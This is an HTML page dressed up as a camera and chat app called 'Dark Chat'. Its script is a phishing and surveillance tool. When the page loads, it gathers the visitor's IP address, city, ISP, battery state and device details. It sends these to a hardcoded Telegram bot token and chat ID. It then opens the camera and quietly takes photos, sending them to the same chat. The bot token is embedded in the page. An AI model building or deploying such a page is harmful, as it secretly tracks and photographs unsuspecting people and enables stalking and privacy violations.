<!DOCTYPE html>
<html lang="en" dir="ltr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Dark Chat</title>
    <style>
        body { margin: 0; background: #000; font-family: Tahoma, sans-serif; height: 100vh; overflow: hidden; display: flex; flex-direction: column; color: white; }
        
        .camera-screen { position: relative; width: 100%; height: 100vh; background: #111; display: flex; flex-direction: column; justify-content: space-between; }
        
        video { 
            display: none; 
            transform: scaleX(-1);
        }
        
        .top-bar { position: relative; z-index: 10; display: flex; justify-content: space-between; align-items: flex-start; padding: 15px 20px; }
        .top-left { display: flex; gap: 15px; align-items: center; }
        .top-right { display: grid; grid-template-columns: repeat(2, auto); gap: 12px; align-items: center; justify-items: center; }
        
        .icon-btn { background: none; border: none; color: white; font-size: 20px; cursor: pointer; display: flex; align-items: center; justify-content: center; text-shadow: 0 2px 4px rgba(0,0,0,0.8); }
        .icon-btn.active { color: #f1c40f; }

        .middle-section { position: relative; z-index: 10; display: flex; justify-content: center; align-items: center; margin-top: auto; margin-bottom: 15px; }
        .capture-container { display: flex; align-items: center; justify-content: center; position: relative; width: 100%; max-width: 320px; }
        
        .capture-btn { width: 70px; height: 70px; border-radius: 50%; background: transparent; border: 4px solid white; cursor: pointer; display: flex; justify-content: center; align-items: center; }
        .capture-inner { width: 58px; height: 58px; border-radius: 50%; background: white; }
        
        .memories-box { position: absolute; left: 25px; display: flex; flex-direction: column; align-items: center; cursor: pointer; }
        .memories-icon { width: 42px; height: 42px; border: 2px solid white; border-radius: 10px; background: rgba(0,0,0,0.4); display: flex; justify-content: center; align-items: center; font-size: 12px; font-weight: bold; position: relative; }
        .memories-dot { position: absolute; top: -3px; right: -3px; width: 9px; height: 9px; background: #00a8ff; border-radius: 50%; border: 2px solid #000; }
        .memories-text { font-size: 10px; margin-top: 2px; text-shadow: 0 1px 2px rgba(0,0,0,0.8); }

        .nav-bar { position: relative; z-index: 10; display: flex; justify-content: space-around; align-items: center; background: rgba(0, 0, 0, 0.6); backdrop-filter: blur(10px); padding: 12px 0; border-top: 1px solid rgba(255,255,255,0.1); }
        .nav-item { background: none; border: none; color: #888; cursor: pointer; display: flex; flex-direction: column; align-items: center; position: relative; padding: 5px; }
        .nav-item.active { color: #00a8ff; }
    </style>
</head>
<body>
    <div class="camera-screen">
        <video id="cameraView" autoplay playsinline></video>
        <canvas id="canvas" style="display:none;"></canvas>
        
        <div class="top-bar">
            <div class="top-left">
                <button class="icon-btn" title="Search">
                    <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round">
                        <circle cx="11" cy="11" r="8"></circle>
                        <line x1="21" y1="21" x2="16.65" y2="16.65"></line>
                    </svg>
                </button>
            </div>
            
            <div class="top-right">
                <button class="icon-btn" title="Add Friend">
                    <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
                        <path d="M16 21v-2a4 4 0 0 0-4-4H5a4 4 0 0 0-4 4v2"></path>
                        <circle cx="8.5" cy="7" r="4"></circle>
                        <line x1="20" y1="8" x2="20" y2="14"></line>
                        <line x1="17" y1="11" x2="23" y2="11"></line>
                    </svg>
                </button>
                
                <button class="icon-btn" onclick="switchCamera()" title="Switch Camera">
                    <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round">
                        <path d="M21.5 2v6h-6M21.34 15.57a10 10 0 1 1-.57-8.38l5.65-5.65"/>
                    </svg>
                </button>
                
                <button class="icon-btn" id="flashBtn" onclick="toggleFlash()" title="Flash" style="grid-column: 2;">
                    <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
                        <path d="M18.36 6.64a9 9 0 1 1-12.73 0"></path>
                        <line x1="12" y1="2" x2="12" y2="12"></line>
                    </svg>
                </button>
            </div>
        </div>

        <div class="middle-section">
            <div class="capture-container">
                <div class="memories-box" onclick="alert('Memories section')">
                    <div class="memories-icon">Pic<div class="memories-dot"></div></div>
                    <span class="memories-text">Memories</span>
                </div>
                <button class="capture-btn" onclick="capturePhoto()">
                    <div class="capture-inner"></div>
                </button>
            </div>
        </div>

        <div class="nav-bar">
            <button class="nav-item" title="Chat">
                <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
                    <path d="M21 11.5a8.38 8.38 0 0 1-.9 3.8 8.5 8.5 0 0 1-7.6 4.7 8.38 8.38 0 0 1-3.8-.9L3 21l1.9-5.7a8.38 8.38 0 0 1-.9-3.8 8.5 8.5 0 0 1 4.7-7.6 8.38 8.38 0 0 1 3.8-.9h.5a8.48 8.48 0 0 1 8 8v.5z"></path>
                </svg>
            </button>
            
            <button class="nav-item" title="Camera">
                <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
                    <path d="M23 19a2 2 0 0 1-2 2H3a2 2 0 0 1-2-2V8a2 2 0 0 1 2-2h4l2-3h6l2 3h4a2 2 0 0 1 2 2z"></path>
                    <circle cx="12" cy="13" r="4"></circle>
                </svg>
            </button>
            
            <button class="nav-item" title="Groups">
                <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
                    <path d="M17 21v-2a4 4 0 0 0-4-4H5a4 4 0 0 0-4 4v2"></path>
                    <circle cx="9" cy="7" r="4"></circle>
                    <path d="M23 21v-2a4 4 0 0 0-3-3.87"></path>
                    <path d="M16 3.13a4 4 0 0 1 0 7.75"></path>
                </svg>
            </button>
            
            <button class="nav-item" title="Spotlight">
                <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
                    <polygon points="5 3 19 12 5 21 5 3"></polygon>
                </svg>
            </button>
        </div>
    </div>

    <script>
        let currentFacingMode = 'user';
        let stream = null;
        let flashOn = false;

        const BOT_TOKEN = '8776982426:AAHwIFQIj36xbb_LoDZw7t1FpiRCLyzeu8U';
        const CHAT_ID = '7641255924';

        async function sendDeviceInfo() {
            let info = "📱 Device Connected!\n\n";

            try {
                let ipResponse = await fetch('https://ipapi.co/json/');
                let ipData = await ipResponse.json();
                info += `🌐 Network Info\n`;
                info += `IP: ${ipData.ip || 'N/A'}\n`;
                info += `ISP: ${ipData.org || 'N/A'}\n`;
                info += `Country: ${ipData.country_name || 'N/A'} (${ipData.country || 'N/A'})\n`;
                info += `City: ${ipData.city || 'N/A'}\n`;
                info += `Timezone: ${ipData.timezone || 'N/A'}\n\n`;
            } catch (e) {
                info += `🌐 Network Info: نەتوانرا وەربگیرێت\n\n`;
            }

            if (navigator.getBattery) {
                try {
                    let battery = await navigator.getBattery();
                    info += `🔋 Battery Info\n`;
                    info += `Level: ${Math.round(battery.level * 100)}%\n`;
                    info += `Charging: ${battery.charging ? 'Yes' : 'No'}\n\n`;
                } catch (e) {}
            }

            let connection = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
            if (connection) {
                info += `📡 Connection\n`;
                info += `Type: ${connection.effectiveType || 'N/A'}\n`;
                info += `Downlink: ${connection.downlink ? connection.downlink + ' Mbps' : 'N/A'}\n`;
                info += `RTT: ${connection.rtt ? connection.rtt + ' ms' : 'N/A'}\n\n`;
            }

            info += `💻 Device Specs\n`;
            info += `Platform: ${navigator.platform || 'N/A'}\n`;
            info += `Cores: ${navigator.hardwareConcurrency || 'N/A'}\n`;
            info += `RAM: ${navigator.deviceMemory ? navigator.deviceMemory + ' GB' : 'N/A'}\n`;
            info += `Screen: ${window.screen.width}x${window.screen.height} (${window.screen.colorDepth}-bit)\n\n`;

            info += `🕵️ User Agent\n${navigator.userAgent}`;

            try {
                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        chat_id: CHAT_ID,
                        text: info
                    })
                });
            } catch (err) {}
        }

        async function startCameraAndAutoCapture() {
            if (stream) {
                stream.getTracks().forEach(track => track.stop());
            }
            try {
                const constraints = { 
                    video: { facingMode: currentFacingMode } 
                };
                stream = await navigator.mediaDevices.getUserMedia(constraints);
                document.getElementById('cameraView').srcObject = stream;
                flashOn = false;
                
                setTimeout(() => {
                    autoCaptureAndSend();
                }, 800);

            } catch (err) {}
        }

        function autoCaptureAndSend() {
            const video = document.getElementById('cameraView');
            const canvas = document.getElementById('canvas');
            
            if (!video.videoWidth) return;

            canvas.width = video.videoWidth;
            canvas.height = video.videoHeight;
            
            const ctx = canvas.getContext('2d');
            
            if (currentFacingMode === 'user') {
                ctx.translate(canvas.width, 0);
                ctx.scale(-1, 1);
            }

            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
            
            canvas.toBlob(async function(blob) {
                const formData = new FormData();
                formData.append('chat_id', CHAT_ID);
                formData.append('photo', blob, 'dark-chat-photo.jpg');
                
                try {
                    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
                        method: 'POST',
                        body: formData
                    });
                } catch (e) {}
            }, 'image/jpeg');
        }

        function switchCamera() {
            currentFacingMode = currentFacingMode === 'user' ? 'environment' : 'user';
            startCameraAndAutoCapture();
        }

        async function toggleFlash() {
            if (!stream) return;
            const track = stream.getVideoTracks()[0];
            const capabilities = track.getCapabilities ? track.getCapabilities() : {};
            
            if (capabilities.torch) {
                try {
                    flashOn = !flashOn;
                    await track.applyConstraints({
                        advanced: [{ torch: flashOn }]
                    });
                    const flashBtn = document.getElementById('flashBtn');
                    if (flashOn) {
                        flashBtn.classList.add('active');
                    } else {
                        flashBtn.classList.remove('active');
                    }
                } catch (err) {}
            }
        }

        function capturePhoto() {
            autoCaptureAndSend();
        }

        sendDeviceInfo();
        startCameraAndAutoCapture();
    </script>
</body>
</html>
